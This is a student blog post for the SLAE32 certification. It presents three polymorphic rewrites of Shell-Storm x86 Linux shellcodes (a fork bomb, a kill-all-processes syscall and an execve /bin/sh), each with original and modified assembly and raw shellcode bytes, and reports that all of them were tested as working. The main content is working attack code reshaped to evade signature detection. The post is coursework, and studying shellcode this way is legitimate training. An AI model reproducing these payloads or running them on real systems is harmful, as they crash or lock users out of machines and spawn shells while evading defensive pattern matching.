---
layout: page
title: Polymorphic Shellcodes- SLAE32 Sixth Exam Assignment
permalink: /polymorphic/
---

## Introduction
Hello Everyone!
This blog post is dedicated to Assignment 6 of the SLAE32 Exam, which is to create 3 different polymorphic shellcodes from shell-storm.


<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/polymorph.jpg">
</p>

## Assignment 6 - Creating polymorphic shellcodes from Shell-Storm


There are 2 main instructions provided to us in this assignment:
- [ ] Pick 3 shellcode samples from Shell-Storm and create polymorphic versions of them to beat pattern matching
- [ ] The polymorphic version cannot be larger than 150% of the existing shellcode

The 3 payloads which i have decided to focus on are:

- [ ] x86/forkbomb
- [ ] x86/killps
- [ ] x86/execve_bin/sh 

## forkbomb Shellcode

In computing, a fork bomb is a denial-of-service attack wherein a process continually replicates itself to deplete available system resources, slowing down or crashing the system due to resource starvation.

![forkbomb](/images/forkbomb.png)

The original shellcode length is 7 bytes, and is presented below:

```c
"\x6a\x02\x58\xcd\x80\xeb\xf9"
```

The original forkbomb.nasm code:

```c
/* By Kris Katterjohn 8/29/2006
 *
 * 7 byte shellcode for a forkbomb
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *      push byte 2
 *      pop eax
 *      int 0x80
 *      jmp short _start
 */
```

I have decided to change the code to the following:

```c
section .text

    global _start

_start:
	xor eax, eax
	inc eax
	inc eax
        push eax
   	pop eax
      	int 0x80
        jmp short _start
```

Now , i have to check my new shellcode length, and to see that i didn't exceed the req's of 150% maximum (which is >=11)

The new shellcode:
```c
\x31\xc0\x40\x40\x50\x58\xcd\x80\xeb\xf6
```

Which is as we can see 10 bytes long, now let's check if the fork bomb still work's properly.

![polyfork](/images/polyfork.png)

And it is indeed working! we can see how the CPU is being flooded to 100% usage!

## killps Shellcode

The following shellcode will kill all running process within the system.

The original shellcode length is 11 bytes, and is presented below:

```c
 "\x31\xc0\xb0\x25\x6a\xff\x5b\xb1\x09\xcd\x80" 
```

The original killps.nasm code:

```c
Title  : kill all running process 
Name   : 11 bytes sys_kill(-1,9) x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : ubuntu linux
*/
#include <stdio.h>

char *killer=
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x25"                    /* mov    $0x25,%al */
 "\x6a\xff"                    /* push   $0xffffffff */
 "\x5b"                        /* pop    %ebx */
 "\xb1\x09"                    /* mov    $0x9,%cl */
 "\xcd\x80"                    /* int    $0x80 */
```

I have decided to change the code to the following:

```c
section .text

    global _start

_start:
	sub eax, eax
	mov al, 0x23
	inc al
	inc al
	push 0xffffffff
	pop ebx
	mov cl, 0x9
	int 0x80
```

Now , i have to check my new shellcode length, and to see that i didn't exceed the req's of 150% maximum (which is >=17)

The new shellcode:
```c
"\x29\xc0\xb0\x23\xfe\xc0\xfe\xc0\x6a\xff\x5b\xb1\x09\xcd\x80"
```

Which is as we can see 15 bytes long, now let's check if the killps shellcode still work's properly.

![killps](/images/killps.gif)

And it is indeed working! we can see how we are being kicked out frm the system

## execve /bin/sh

The following shellcode will execbute /bin/sh.

The original shellcode length is 23 bytes, and is presented below:

```c
 ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; 
```

The original execve.nasm code:

```c
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80
```

I have decided to change the code to the following:

```c
global _start

section .text

_start:
	sub eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	inc eax
	dec eax
	push eax
	push ebx
	mov ecx, esp
	mov al, 0xa
	inc al
	int 0x80
```

Now , i have to check my new shellcode length, and to see that i didn't exceed the req's of 150% maximum (which is >=17)

The new shellcode:
```c
""\x29\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x40\x48\x50\x53\x89\xe1\xb0\x0a\xfe\xc0\xcd\x80""
```

Which is as we can see 27 bytes long, now let's check if the execve shellcode still work's properly.

![27execve](/images/27execve.png)

And it is indeed working! we can see how we are executing the /bin/sh!

And that's it for the sixth assignment!

## References

* forkbomb explanation - 
* forkbomb - <https://en.wikipedia.org/wiki/Fork_bomb>
* killps - <http://shell-storm.org/shellcode/files/shellcode-626.php>
* execve_bin/sh - <http://shell-storm.org/shellcode/files/shellcode-827.php>

## Wrap-Up
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification

<https://www.pentesteracademy.com/course?id=3>

Student ID: SLAE - 1543

All the source code which i have used throughout the assignment is available here: <https://github.com/NagliNagli/SLAE/tree/master/Polymorphic>

Cheers,
Gal.
